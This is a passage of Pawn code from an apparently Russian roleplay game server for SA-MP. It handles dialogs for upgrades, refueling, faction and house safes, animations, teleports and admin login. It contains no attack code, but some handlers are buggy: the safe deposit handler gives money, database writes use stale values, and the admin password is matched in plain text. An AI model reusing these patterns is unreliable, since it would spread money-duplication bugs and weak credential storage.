					else Settings[playerid][5] = 0;
				}
			}

			MysqlUpdatePlayerInt(playerid, "set1", Settings[playerid][0]);
			MysqlUpdatePlayerInt(playerid, "set2", Settings[playerid][1]);
			MysqlUpdatePlayerInt(playerid, "set3", Settings[playerid][2]);
			MysqlUpdatePlayerInt(playerid, "set4", Settings[playerid][3]);
			MysqlUpdatePlayerInt(playerid, "set5", Settings[playerid][4]);
			MysqlUpdatePlayerInt(playerid, "set6", Settings[playerid][5]);
			MysqlUpdatePlayerInt(playerid, "set7", Settings[playerid][6]);
		}
		case D_JOB+177:
		{
			if(!response) return 1;
			switch(listitem)
			{
			case 0:
			    {
					if(PI[playerid][pImprove][0] == 1) return SendClientMessage(playerid, COLOR_GREY, "Вы уже приобрели данное улучшение!");
					if(PI[playerid][pLevel] < 2) return SendClientMessage(playerid, COLOR_GREY, "Необходим 2 уровень и 50000р");
					if(GetMoney(playerid) < 50000) return SendClientMessage(playerid, COLOR_GREY, "Необходим 2 уровень и 50000р");
					GiveMoney(playerid, -50000);
					PI[playerid][pImprove][0] = 1;
					SendClientMessage(playerid, COLOR_LIME, "Ваша выносливость была улучшена");
				}
			case 1:
				{
					if(PI[playerid][pImprove][1] == 1) return SendClientMessage(playerid,COLOR_GREY,"Вы уже приобрели данное улучшение!");
					if(PI[playerid][pLevel] < 3) return SendClientMessage(playerid, COLOR_GREY, "Необходим 3 уровень и 75000р");
					if(GetMoney(playerid) < 75000) return SendClientMessage(playerid, COLOR_GREY, "Необходим 3 уровень и 75000р");
					GiveMoney(playerid, -75000);
					PI[playerid][pImprove][1] = 1;
					SendClientMessage(playerid, COLOR_LIME, "Теперь Вы можете самостоятельно увольняться с организации (/leave)");
				}
			case 2:
			    {
			        if(PI[playerid][pImprove][3] == 1) return SendClientMessage(playerid,COLOR_GREY,"Вы уже приобрели данное улучшение!");
					if(PI[playerid][pLevel] < 10) return SendClientMessage(playerid, COLOR_GREY, "Необходим 10 уровень и 125000р");
					if(GetMoney(playerid) < 125000) return SendClientMessage(playerid, COLOR_GREY, "Необходим 10 уровень и 125000р");
					GiveMoney(playerid, -125000);
					PI[playerid][pImprove][3] = 1;
					SendClientMessage(playerid, COLOR_LIME, "Теперь Ваш транспорт не будет глохнуть при столкновениях");
			    }
			case 3:
			    {
			        new string_dialogue[841], string[340];
			        format(string, sizeof(string), "{FFFFFF}Выносливость - способность организма к продолжительному выполнению какой-либо работы\nбез заметного снижения работоспособности. С данным улучшением, при голоде,\nВаше здоровье будет гораздо дольше держаться, по сравнению с невыносливым человеком.");
					strcat(string_dialogue, string);
					strcat(string_dialogue, "\n\n");
					format(string, sizeof(string), "{FFFFFF}Решительность - это индивидуальное качество воли человека, связанное со способностью и умением\nсамостоятельно и своевременно принимать ответственные решения и упорно реализовывать их в реальной деятельности.\nДанное улучшение позволит Вам самостоятельно, без каких-либо просьб, увольняться из организации - /leave.");
					strcat(string_dialogue, string);
					strcat(string_dialogue, "\n\n");
					format(string, sizeof(string), "{FFFFFF}Мастер вождения - став мастером вождения, двигатель транспорта под Вашим управлением\nбольше не будет глохнуть при различных ударах.");
					strcat(string_dialogue, string);
					ShowPlayerDialog(playerid, D_JOB+178, 0, "Помощь", string_dialogue, "Закрыть", "Назад");
			    }
			}

			new fmt_query[70+MAX_PLAYER_NAME];

			format(fmt_query, sizeof fmt_query, "UPDATE accounts SET improves='%i, %i, %i, %i' WHERE name='%s'", PI[playerid][pImprove][0],PI[playerid][pImprove][1],PI[playerid][pImprove][2],PI[playerid][pImprove][3], GetName(playerid));
			mysql_query(dbHandle, fmt_query);
		}
	case D_JOB+178:
		{
		    if(!response)
			{
			    new string[300];
				format(string, sizeof(string), "%s\n%s\n%s\n%s\n{FFFFFF}Помощь",
				(PI[playerid][pImprove][0] != 1) ? ("{FFFFFF}Выносливость\t\t| {F04245}Не имеется (2 уровень и 50.000р)") : ("{FFFFFF}Выносливость\t\t| {63BD4E}Куплено"),
				(PI[playerid][pImprove][1] != 1) ? ("{FFFFFF}Решительность\t| {F04245}Не имеется (3 уровень и 75.000р)") : ("{FFFFFF}Решительность\t| {63BD4E}Куплено (/leave)"),
				(PI[playerid][pImprove][3] != 1) ? ("{FFFFFF}Мастер вождения\t| {F04245}Не имеется (10 уровень и 125.000р)") : ("{FFFFFF}Мастер вождения\t| {63BD4E}Куплено"));
				return ShowPlayerDialog(playerid, D_JOB+177, DIALOG_STYLE_LIST, "Улучшения персонажа", string, "Выбрать", "Назад");
			}
		}
	case D_JOB+179:
	    {
			if(!response) return callcmd::donate(playerid);
			if(PI[playerid][pCredits] < 30) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно кредитов!");

			new len = strlen(inputtext);

			if(3 <= len <= 20)
			{
				new bool: valid_name = true;
				for(new idx; idx < len; idx ++)
				{
					switch(inputtext[idx])
					{
						case 'a'..'z', 'A'..'Z', '[', ']', '_': continue;
						default:
							valid_name = false;
					}
				}

				if(valid_name == false)
					return ShowPlayerDialog(playerid, D_JOB+179, 1, "Смена ника", "{FFFFFF}Введите будущий ник:", "Принять", "Назад");

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "SELECT * FROM "T_ACCOUNTS" WHERE name = '%s'", inputtext);
				mysql_tquery(dbHandle, STRING_GLOBAL, "OnPlayerChangeDonateName", "is", playerid, inputtext);
			}
			else ShowPlayerDialog(playerid, D_JOB+179, 1, "Смена ника", "{FFFFFF}Введите будущий ник:", "Принять", "Назад");
	    }
	case D_JOB+128:
		{
			if(!response) return true;
			new fuel;
			new bizz = BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bTill];
			if(sscanf(inputtext, "i",fuel)) return ShowPlayerDialog(playerid, D_JOB+128, DIALOG_STYLE_INPUT, "Топливо", "{FFFFFF}Введите количество литров топлива:", "Принять", "Отмена");
			if(fuel < 1 || fuel > 100)
			{
				SendClientMessage(playerid, COLOR_GREY, "Топлива от 1 до 100 литров!");
				return ShowPlayerDialog(playerid, D_JOB+128, DIALOG_STYLE_INPUT, "Топливо", "{FFFFFF}Введите количество литров топлива:", "Принять", "Отмена");
			}
			if(fuel+GetVehicleData(GetPlayerVehicleID(playerid), veh_fuel) > 100)
			{
				SendMes(playerid, COLOR_DARKORANGE, "Слишком много топлива. Рекомендуем: %i литров", 100-GetVehicleData(GetPlayerVehicleID(playerid), veh_fuel));
				return ShowPlayerDialog(playerid, D_JOB+128, DIALOG_STYLE_INPUT, "Топливо", "{FFFFFF}Введите количество литров топлива:", "Принять", "Отмена");
			}
			if(fuel*bizz > GetMoney(playerid))
			{
				SendMess(playerid, MSG_NOT_MONEY);
				return ShowPlayerDialog(playerid, D_JOB+128, DIALOG_STYLE_INPUT, "Топливо", "{FFFFFF}Введите количество литров топлива:", "Принять", "Отмена");
			}
			new price = fuel*bizz;
			GiveMoney(playerid, -price);
			if(BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bProduct] > 0)
			{
				BizzPay[GetPVarInt(playerid, "FuelBizzID")] += price/2;
				BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bMoney] += price/2;
				BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bProduct] -= fuel;
				MysqlUpdateBizzInt(BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bID], "product", BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bProduct]);
			}
			DeletePVar(playerid, "FuelBizzID");
			SendClientMessage(playerid, COLOR_LIME, "Транспорт заправляется, пожалуйста подождите");
			SetPVarInt(playerid, "Refueling", fuel);
			TogglePlayerControllable(playerid, false);
			ReFuelTimer[playerid] = SetTimerEx("ReFill", 500, true, "i", playerid);
			PlayerMenuExit(playerid);
			return true;
		}
		case D_JOB+130:
		{
			new targetid = GetPVarInt(playerid, "MechanicPlayer"), price = GetPVarInt(playerid, "MechanicPrice");
			if(response)
			{
				if(GetPlayerState(playerid) == 2)
				{
					if(GetMoney(playerid) < price)
					{
						SendMes(targetid,COLOR_LIGHTBLUE, "У игрока %s недостаточно средств", GetName(playerid));
						DeletePVar(playerid, "MechanicPlayer");
						DeletePVar(playerid, "MechanicPrice");
						return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств");
					}
					if(GetVehicleData(GetPlayerVehicleID(playerid), veh_fuel) >= 100)
					{
						SendClientMessage(targetid, COLOR_BLUE, "У игрока достаточно бензина в баке");
						DeletePVar(playerid, "MechanicPlayer");
						DeletePVar(playerid, "MechanicPrice");
						return SendClientMessage(playerid, COLOR_GREY, "У Вас достаточно бензина в баке");
					}
					GiveMoney(playerid, -price);
					PI[playerid][pBank] += price;
					MysqlUpdatePlayerInt(playerid, "bank", PI[playerid][pBank]);
					SendMes(playerid, COLOR_BLUE, "Автомеханик %s заправил Ваш транспорт за %iр", GetName(targetid), price);
					SendMes(targetid, COLOR_BLUE, "Вы заправили транспорт %s за %iр", GetName(playerid), price);
					GetVehicleData(GetPlayerVehicleID(playerid), veh_fuel) = 100;
				}
				else SendClientMessage(playerid, COLOR_LIGHTBLUE, "Вы должны находиться в транспорте!");
			}
			else
			{
				SendMes(targetid, COLOR_LIGHTBLUE, "%s отклонил предложение заправить транспорт за %iр", GetName(playerid), price);
				DeletePVar(playerid, "MechanicPlayer");
				DeletePVar(playerid, "MechanicPrice");
			}
		}
		case D_JOB+131:
		{
			if(!response) return 1;
			switch(listitem)
			{
			case 0:
	            {
			        new price, bank;
					if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_JOB+133, 1, "Положить деньги", "{FFFFFF}Введите количество денег:", "Положить", "Назад");
					if(price < 1 || price > GetMoney(playerid))
					{
						SendMes(playerid, COLOR_GREY, "Количество доллларов от 1 до %i!", GetMoney(playerid));
						return ShowPlayerDialog(playerid, D_JOB+133, 1, "Положить деньги", "{FFFFFF}Введите количество денег:", "Положить", "Назад");
					}
					if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_JOB+132, 1, "Снять деньги", "{FFFFFF}Введите количество денег:", "Принять", "Назад");
					if(PI[playerid][pMember] == TEAM_SMI) bank = FracBank[8];
					if(PI[playerid][pMember] == TEAM_MERIA) bank = FracBank[9];
					if(PI[playerid][pMember] == TEAM_LVNEWS) bank = FracBank[10];
					new sbank = bank+price;
					SendMes(playerid, COLOR_BLUE, "Вы положили %iр в сейф. Теперь в сейфе: %iр", price, sbank);
					GiveMoney(playerid, -price);
					if(PI[playerid][pMember] == TEAM_SMI) MysqlUpdateOtherInt("lsnbank", FracBank[8]),FracBank[8]+=price;
					if(PI[playerid][pMember] == TEAM_MERIA) MysqlUpdateOtherInt("sfnbank", FracBank[9]),FracBank[9]+=price;
					if(PI[playerid][pMember] == TEAM_LVNEWS) MysqlUpdateOtherInt("lvnbank", FracBank[10]),FracBank[10]+=price;
				}
			case 1:
			   	{
			   		if(PlayerLogged[playerid] == false) return 1;
			      	if(PI[playerid][pLeader] > 0)
			        {
						new price, bank;
						if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_JOB+132, 1, "Снять деньги", "{FFFFFF}Введите количество денег:", "Обналичить", "Назад");
						if(PI[playerid][pMember] == TEAM_SMI) bank = FracBank[8];
						if(PI[playerid][pMember] == TEAM_MERIA) bank = FracBank[9];
						if(PI[playerid][pMember] == TEAM_LVNEWS) bank = FracBank[10];
						if(price < 1 || price > bank)
						{
							SendMes(playerid, COLOR_GREY, "Количество денег от 1 до %i!", bank);
							return ShowPlayerDialog(playerid, D_JOB+132, 1, "Снять деньги", "{FFFFFF}Введите количество денег:", "Обналичить", "Назад");
						}
						SendMes(playerid, COLOR_BLUE, "Вы взяли %iр из сейфа. Остаток: %iр", price, bank-price);
						GiveMoney(playerid, price);
						if(PI[playerid][pMember] == TEAM_SMI) MysqlUpdateOtherInt("lsnbank", FracBank[8]),FracBank[8]-=price;
						if(PI[playerid][pMember] == TEAM_MERIA) MysqlUpdateOtherInt("sfnbank", FracBank[9]),FracBank[9]-=price;
						if(PI[playerid][pMember] == TEAM_LVNEWS) MysqlUpdateOtherInt("lvnbank", FracBank[10]),FracBank[10]-=price;
					}
				}
			}
		}
	case D_JOB+132:
		{
			if(PlayerLogged[playerid] == false) return 1;
          	if(PI[playerid][pLeader] > 0)
	        {
				new price, bank;
				if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_JOB+132, 1, "Снять деньги", "{FFFFFF}Введите количество денег:", "Обналичить", "Назад");
				if(PI[playerid][pMember] == TEAM_SMI) bank = FracBank[8];
				if(PI[playerid][pMember] == TEAM_MERIA) bank = FracBank[9];
				if(PI[playerid][pMember] == TEAM_LVNEWS) bank = FracBank[10];
				if(price < 1 || price > bank)
				{
					SendMes(playerid, COLOR_GREY, "Количество денег от 1 до %i!", bank);
					return ShowPlayerDialog(playerid, D_JOB+132, 1, "Снять деньги", "{FFFFFF}Введите количество денег:", "Обналичить", "Назад");
				}
				SendMes(playerid, COLOR_BLUE, "Вы взяли %iр из сейфа. Остаток: %iр", price, bank-price);
				GiveMoney(playerid, -price);
				if(PI[playerid][pMember] == TEAM_SMI) MysqlUpdateOtherInt("lsnbank", FracBank[8]),FracBank[8]-=price;
				if(PI[playerid][pMember] == TEAM_MERIA) MysqlUpdateOtherInt("sfnbank", FracBank[9]),FracBank[9]-=price;
				if(PI[playerid][pMember] == TEAM_LVNEWS) MysqlUpdateOtherInt("lvnbank", FracBank[10]),FracBank[10]-=price;
			}
         	else SendClientMessage(playerid,COLOR_GREY,"Вы не лидер");
			return 1;
		}
	case D_JOB+133:
		{
			new price, bank;
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_JOB+133, 1, "Положить деньги", "{FFFFFF}Введите количество денег:", "Положить", "Назад");
			if(price < 1 || price > GetMoney(playerid))
			{
				SendMes(playerid, COLOR_GREY, "Количество доллларов от 1 до %i!", GetMoney(playerid));
				return ShowPlayerDialog(playerid, D_JOB+133, 1, "Положить деньги", "{FFFFFF}Введите количество денег:", "Положить", "Назад");
			}
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_JOB+132, 1, "Снять деньги", "{FFFFFF}Введите количество денег:", "Принять", "Назад");
			if(PI[playerid][pMember] == TEAM_SMI) bank = FracBank[8];
			if(PI[playerid][pMember] == TEAM_MERIA) bank = FracBank[9];
			if(PI[playerid][pMember] == TEAM_LVNEWS) bank = FracBank[10];
			new sbank = bank+price;
			SendMes(playerid, COLOR_BLUE, "Вы положили %iр в сейф. Теперь в сейфе: %iр", price, sbank);
			GiveMoney(playerid, price);
			if(PI[playerid][pMember] == TEAM_SMI) MysqlUpdateOtherInt("lsnbank", FracBank[8]),FracBank[8]+=price;
			if(PI[playerid][pMember] == TEAM_MERIA) MysqlUpdateOtherInt("sfnbank", FracBank[9]),FracBank[9]+=price;
			if(PI[playerid][pMember] == TEAM_LVNEWS) MysqlUpdateOtherInt("lvnbank", FracBank[10]),FracBank[10]+=price;
			return 1;
		}
	case D_JOB+136:
		{
			if(!response) return 1;
	   		switch(listitem)
	   		{
				case 0: SetPlayerSpecialAction(playerid,SPECIAL_ACTION_HANDSUP);
				case 1: SetPlayerSpecialAction(playerid,SPECIAL_ACTION_PISS);
			    case 2: SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE1);
			    case 3: SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE2);
			    case 4: SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE3);
			    case 5: SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE4);
			    case 6: ApplyAnimation(playerid,"DANCING","dnce_M_b",4.1,1,0,0,0,0,1);
				case 7: ApplyAnimation(playerid,"DANCING","dnce_M_a",4.1,1,0,0,0,0,1);
				case 8: ApplyAnimation(playerid,"DANCING","dnce_M_b",4.1,1,0,0,0,0,1);
				case 9: ApplyAnimation(playerid,"DANCING","DAN_Down_A",4.1,1,0,0,0,0,1);
				case 10: ApplyAnimation(playerid,"DANCING","DAN_Left_A",4.1,1,0,0,0,0,1);
				case 11: ApplyAnimation(playerid,"DANCING","DAN_Loop_A",4.1,1,0,0,0,0,1);
				case 12: ApplyAnimation(playerid,"SMOKING","M_smklean_loop",4.1,1,0,0,0,0,1);
				case 13: ApplyAnimation(playerid,"PED","fucku",4.1,0,0,0,0,0,1);
				case 14: ApplyAnimation(playerid,"INT_OFFICE","OFF_Sit_Crash",4.1,0,0,0,1,0,1);
				case 15: ApplyAnimation(playerid,"BEACH","ParkSit_W_Loop",4.1,1,0,0,1,0,1);
				case 16: ApplyAnimation(playerid,"PED","SEAT_down",4.1,0,0,0,1,0,1);
				case 17: ApplyAnimation(playerid,"BEACH","ParkSit_M_loop",4.1,1,0,0,1,0,1);
				case 18: ApplyAnimation(playerid,"BEACH","SitnWait_loop_W",4.1,1,0,0,1,0,1);
				case 19: ApplyAnimation(playerid,"BEACH","Lay_Bac_Loop",4.1,1,0,0,1,0,1);
				case 20: ApplyAnimation(playerid,"GANGS","hndshkba",4.1,0,0,0,0,0,1);
				case 21: ApplyAnimation(playerid,"ON_LOOKERS","WAVE_LOOP",4.1,1,1,1,0,0,1);
				case 22: ApplyAnimation(playerid,"BENCHPRESS","GYM_BP_CELEBRATE",4.1,1,1,1,0,0,1);
				case 23: ApplyAnimation(playerid,"GANGS","smkcig_prtl",4.1,0,0,0,0,0,1);
				case 24: ApplyAnimation(playerid,"DEALER","DEALER_DEAL",4.1,0,0,0,0,0,1);
				case 25: ApplyAnimation(playerid,"DEALER","DEALER_IDLE_01",4.1,0,0,0,0,0,1);
				case 26: ApplyAnimation(playerid,"DEALER","DEALER_IDLE_03",4.1,0,0,0,0,0,1);
				case 27: ApplyAnimation(playerid,"DEALER","DRUGS_BUY",4.1,0,0,0,0,0,1);
				case 28: ApplyAnimation(playerid,"RYDER","RYD_Die_PT1",4.1,1,1,0,0,0,1);
				case 29: ApplyAnimation(playerid,"MISC","plyr_shkhead",4.1,0,0,0,0,0,1);
				case 30: ApplyAnimation(playerid,"CRACK","Crckidle2",4.1,1,0,0,0,0,0);
				case 31: ApplyAnimation(playerid,"PED","cower",3.0,1,0,0,0,0);
		    }
		    SetPVarInt(playerid, "Animation", 1);
			TextDrawShowForPlayer(playerid, AnimDraw);
			return 1;
		}
	case D_JOB+139:
		{
		    if(!response) return 1;
			switch(listitem)
			{
			    case 0: ShowPlayerDialog(playerid, D_JOB+140, 2, "Важные места",
				"1. Вокзал\n\
				2. Автошкола\n\
				3. Завод по сборке оружия\n\
				4. Ферма\n\
				5. Банк Арзамас\n\
				6. Транспортная компания\n\
				7. Автосалон \n\
				8. Лесорубы\n\
				9. Шахта\n\
				10. Анашан\n\
				11. Военкомат", "Телепорт", "Назад");
			    case 1: ShowPlayerDialog(playerid, D_JOB+141, 2, "Базы организаций",
				"1. Администрация Области\n\
				2. МВД\n\
				3. ГИБДД\n\
				4. СМИ\n\
				5. Мин.Здрав.\n\
				6. ОПГ Подольская\n\
				7. ОПГ Тамбовская\n\
				8. Русская Мафия\n\
				9. Итальянская Мафия\n\
				10. Армия", "Телепорт", "Назад");
			    case 2: ShowPlayerDialog(playerid, D_JOB+142, 2, "Развлечения",
				"1. Казино\n2. Пейнтбол\n3. Арена для МП", "Телепорт", "Назад");
				case 3: ShowPlayerDialog(playerid, D_JOB+143, 2, "Города",
				"1. Южный\n\
				2. Арзамас\n\
				3. Лыткарино\n\
				4. Новое Эдово\n\
				5. Батырево", "Телепорт", "Назад");
				case 4: ShowPlayerDialog(playerid, D_JOB+144, 2, "Поселки и деревни",
				"1. Гарель\n\
				2. Бусаево\n\
				3. Роговичи\n\
				4. Корякино", "Телепорт", "Назад");
			}
		}
	case D_JOB+140:
		{
			if(!response) return callcmd::tp(playerid);
			new Float:X, Float:Y, Float:Z, intid = 0, worldid = 0;
			switch(listitem)
			{
				case 0: X = 0, Y = 0, Z = 0; // вокзал
			    case 1: X = 1902.9646, Y = 2227.3889, Z = 15.7138; // автошкола
				case 2: X = 0.0, Y = 0.0, Z = 0.0; // сборка оружия
			    case 3: X = -803.4072, Y = -1232.6659, Z = 43.3298; // Ферма
			    case 4: X = 56.7014, Y = 848.4837, Z = 12.1494; // Банк
			    case 5: X = -884.6059, Y = 1186.6309, Z = 10.5134; // Транспортная компания
			    case 6: X = -23.0101, Y = 542.3691, Z = 11.6129; // Автосалон
				case 7: X = 800.5248, Y = 526.8453, Z = 11.9975; // Лесорубы
                case 8: X = 2300.9016, Y = 1746.6086, Z = 2.6362; // Шахта
                case 9: X = 2482.2849, Y = -751.5681, Z = 12.0969; // Анашан
                case 10: X = 1903.5618, Y = 2302.5378, Z = 15.7523; // Военкомат
			}
			if (GetPlayerState(playerid) == 2) SetVehiclePos(GetPlayerVehicleID(playerid), X, Y, Z);
			else SetPlayerPos(playerid, X, Y, Z);
			SetPlayerInterior(playerid, intid);
			SetPlayerVirtualWorld(playerid, worldid);
		}
		case D_JOB+141: // базы организаций
		{
		    if(!response) return callcmd::tp(playerid);
			new Float:X, Float:Y, Float:Z, intid = 0, worldid = 0;
			switch(listitem)
			{
				case 0: X = 1821.1362, Y = 2095.7847, Z = 16.1631; // АО
				case 1: X = 2579.0955, Y = -2407.9734, Z = 22.0095; // МВД
				case 2: X = X = -286.4495, Y = 580.7369, Z = 12.1120; // ГИБДД
				case 3: X = 2089.9434, Y = -2409.0881, Z = 21.7477; // СМИ
				case 4: X = 440.4861, Y = 1569.2905, Z = 11.5665; // Мин.Здрав.
				case 5: X = -2243.2393, Y = 265.8196, Z = 24.5337; // ОПГ Подольская
				case 6: X = 1940.6082, Y = 2160.8257, Z = 15.7060; // ОПГ Тамбовская
				case 7: X = 1935.5800, Y = -1929.7277, Z = 33.8186; // Русская мафия
				case 8: X = -2356.4968, Y = 2608.4368, Z = 41.6159; // Итальянская мафия
				case 9: X = 26.3218, Y = 2835.9031, Z = 23.8580; // Армия
				case 10: X = 0.0, Y = 0.0, Z = 0.0; //свободный слот
			}
			if (GetPlayerState(playerid) == 2) SetVehiclePos(GetPlayerVehicleID(playerid), X, Y, Z);
			else SetPlayerPos(playerid, X, Y, Z);
			SetPlayerInterior(playerid, intid);
			SetPlayerVirtualWorld(playerid, worldid);
		}
		case D_JOB+142:
		{
		    if(!response) return callcmd::tp(playerid);
			new Float:X, Float:Y, Float:Z, intid = 0, worldid = 0;
			switch(listitem)
			{
				case 0: X = -286.6680, Y = 1310.1361, Z = 13.3812; // Казино
				case 1: X = -289.2142, Y = 962.3782, Z = 12.0010;// Пейнтбол
				case 2: X = 3.8480, Y = 7.5930, Z = 1101.1155; //Арена для МП
			}
			if (GetPlayerState(playerid) == 2) SetVehiclePos(GetPlayerVehicleID(playerid), X, Y, Z);
			else SetPlayerPos(playerid, X, Y, Z);
			SetPlayerInterior(playerid, intid);
			SetPlayerVirtualWorld(playerid, worldid);
		}
    case D_JOB+143:
    {
        if(!response) return callcmd::tp(playerid);
		new Float:X, Float:Y, Float:Z, intid = 0, worldid = 0;
		switch(listitem)
		{
			case 0: X = 2540.893310, Y = -2195.986328, Z = 21.962968;
			case 1: X = 159.894577, Y = 780.378540, Z = 12.150824;
			case 2: X = -2248.339599, Y = 193.563323, Z = 24.544965;
			case 3: X = -2458.587158, Y = 2840.416015, Z = 38.407436;
			case 4: X = 1889.1847, Y = 2047.6996, Z = 16.0639; // батырево
		}
		if (GetPlayerState(playerid) == 2) SetVehiclePos(GetPlayerVehicleID(playerid), X, Y, Z);
		else SetPlayerPos(playerid, X, Y, Z);
		SetPlayerInterior(playerid, intid);
		SetPlayerVirtualWorld(playerid, worldid);
    }
    case D_JOB+144:
    {
        if(!response) return callcmd::tp(playerid);
		new Float:X, Float:Y, Float:Z, intid = 0, worldid = 0;
		switch(listitem)
		{
			case 0: X = 2495.061523, Y = -221.115982, Z = 2.366239;
			case 1: X = -570.236694, Y = -1592.430664, Z = 40.583248;
            case 2: X = 2285.218261, Y = 1371.534667, Z = 11.457441;
			case 3: X = 550.803222, Y = -1248.813964, Z = 40.691287;
		}
		if (GetPlayerState(playerid) == 2) SetVehiclePos(GetPlayerVehicleID(playerid), X, Y, Z);
		else SetPlayerPos(playerid, X, Y, Z);
		SetPlayerInterior(playerid, intid);
		SetPlayerVirtualWorld(playerid, worldid);
    }
 	case D_ALOGIN:
	{
		if(!response) return 1;
		new string[144];
		switch(GetPVarInt(playerid,"aLogin"))
		{
			case 1:
			{
				if(!strlen(inputtext)|| !strcmp(inputtext, "qwerty", true) || strlen(inputtext) < 6 || strlen(inputtext) > 16 || strfind(inputtext, "=", true) != -1)
					return ShowPlayerDialog(playerid, D_ALOGIN, DIALOG_STYLE_PASSWORD, "Регистрация администратора", "\
					{FFFFFF}Введите пароль, который будет от панели администратора\n\n\
					{63BD4E}Примечание:\n\
					\t- Пароль должен состоять из латинских букв и цифр\n\
					\t- Размер пароля от 6 до 15 символов", "Принять", "Отмена");
				SetPVarString(playerid, "inputtext", inputtext);
				format(string, sizeof(string), "SELECT * FROM "T_ADMIN" WHERE `name` = '%s'", GetName(playerid));
				mysql_tquery(dbHandle, string, "AloginReg", "is", playerid, GetName(playerid));
			}
			case 0:
			{
				if(!strlen(inputtext)) return ShowPlayerDialog(playerid, D_ALOGIN, DIALOG_STYLE_PASSWORD, "Доступ администратора", "\
				{FFFFFF}Введите Ваш пароль от панели администратора", "Принять", "Отмена");
				mysql_format(dbHandle, string, sizeof(string), "SELECT * FROM "T_ADMIN" WHERE `name` = '%s' AND `password` = '%e'", GetName(playerid), inputtext);
				mysql_tquery(dbHandle, string, "AloginAuth", "is", playerid, inputtext);
			}
		}
		return 1;
	 }
	case DIALOG_CUPBOARD:
		{
			if(!response) return 1;
			if(response)
			{
				switch(listitem)
				{
					case 0: ShowPlayerDialog(playerid, DIALOG_TAKE_CUPBOARD_MONEY, DIALOG_STYLE_INPUT, "{FFCC00}Взять деньги из шкафа",
					"{FFFFFF}Введите количество денег, которые Вы хотите взять из сейфа","Далее", "Отмена");
					case 1: ShowPlayerDialog(playerid, DIALOG_PUT_CUPBOARD_MONEY, DIALOG_STYLE_INPUT, "{FFCC00}Положить деньги в шкаф",
					"{FFFFFF}Введите количество денег, которые Вы хотите положить в сейф","Далее", "Отмена");
					case 2: ShowPlayerDialog(playerid, DIALOG_TAKE_CUPBOARD_PATRONS, DIALOG_STYLE_INPUT, "{FFCC00}Взять патроны из шкафа",
					"{FFFFFF}Введите количество патронов, которые Вы хотите взять из сейфа","Далее", "Отмена");
					case 3: ShowPlayerDialog(playerid, DIALOG_PUT_CUPBOARD_PATRONS, DIALOG_STYLE_INPUT, "{FFCC00}Положить патроны в шкаф",
					"{FFFFFF}Введите количество патронов, которые Вы хотите положить в сейф","Далее", "Отмена");
					case 4: ShowPlayerDialog(playerid, DIALOG_PUT_CUPBOARD_HDRUGS, DIALOG_STYLE_INPUT, "{FFCC00}Положить наркотики в шкаф",
					"{FFFFFF}Введите количество тяжёлых наркотиков, которые Вы хотите положить в сейф", "Далее", "Отмена");
					case 5: ShowPlayerDialog(playerid, DIALOG_TAKE_CUPBOARD_HDRUGS, DIALOG_STYLE_INPUT, "{FFCC00}Взять наркотики из шкафа",
					"{FFFFFF}Введите количество лёгких наркотиков, которые Вы хотите взять из сейфа", "Далее", "Отмена");
				}
			}
		}
		case DIALOG_TAKE_CUPBOARD_MONEY:
		{
			if(!response)
			{
				return ShowCupboard(playerid);
			}
			if(response)
			{
				new id = GetPVarInt(playerid, "safeid");
				if(!strlen(inputtext) || !IsTextNumeric(inputtext)) return ShowCupboard(playerid);
				if(!(1 <= strval(inputtext) <= 1000000)) return SendClientMessage(playerid, COLOR_GREY, "Вы можете взять из сейфа от 1 до 1.000.000 рублей");
				if(HouseInfo[id][hMoney] < strval(inputtext)) return SendClientMessage(playerid, COLOR_GREY, "В сейфе нет такого количества денег");
				HouseInfo[id][hMoney] -= strval(inputtext);
				GiveMoney(playerid, strval(inputtext));
				new fmt_msg[70];
				mysql_format(dbHandle, fmt_msg, sizeof fmt_msg, "UPDATE `house` SET `hMoney` = '%d' WHERE `id` = '%d'", HouseInfo[id][hMoney], HouseInfo[id][hID]);
				mysql_query(dbHandle, fmt_msg, false);
				format(fmt_msg, sizeof fmt_msg, "Вы взяли из шкафа %d рублей", strval(inputtext));
				SendClientMessage(playerid, COLOR_GREEN, fmt_msg);
				if(HouseInfo[id][hDiscript] != 4) UpdateCupboard(id);
				return ShowCupboard(playerid);
			}
		}
		case DIALOG_PUT_CUPBOARD_MONEY:
		{
			if(!response)
			{
				return ShowCupboard(playerid);
			}
			if(response)
			{
				new id = GetPVarInt(playerid, "safeid");
				if(!strlen(inputtext) || !IsTextNumeric(inputtext)) return ShowCupboard(playerid);
				if(!(1 <= strval(inputtext) <= 1000000)) return SendClientMessage(playerid, COLOR_DARKORANGE, "Вы можете положить в сейф от 1 до 1.000.000 рублей");
				if(PI[playerid][pCash] < strval(inputtext)) return SendClientMessage(playerid, COLOR_DARKORANGE, "У Вас нет такого количества денег");
				if(HouseInfo[id][hMoney] + strval(inputtext) > 1000000) return SendClientMessage(playerid, COLOR_DARKORANGE, "Сейф может вместить только 1.000.000 рублей");
				HouseInfo[id][hMoney] += strval(inputtext);
				GiveMoney(playerid, -strval(inputtext));
				new fmt_msg[70];
				mysql_format(dbHandle, fmt_msg, sizeof fmt_msg, "UPDATE `house` SET `hMoney` = '%d' WHERE `id` = '%d'", HouseInfo[id][hMoney], HouseInfo[id][hID]);
				mysql_query(dbHandle, fmt_msg, false);
				format(fmt_msg, sizeof fmt_msg, "Вы положили в сейф %d рублей", strval(inputtext));
				SendClientMessage(playerid, COLOR_LIME, fmt_msg);
				if(HouseInfo[id][hDiscript] != 4) UpdateCupboard(id);
				return ShowCupboard(playerid);
			}
		}
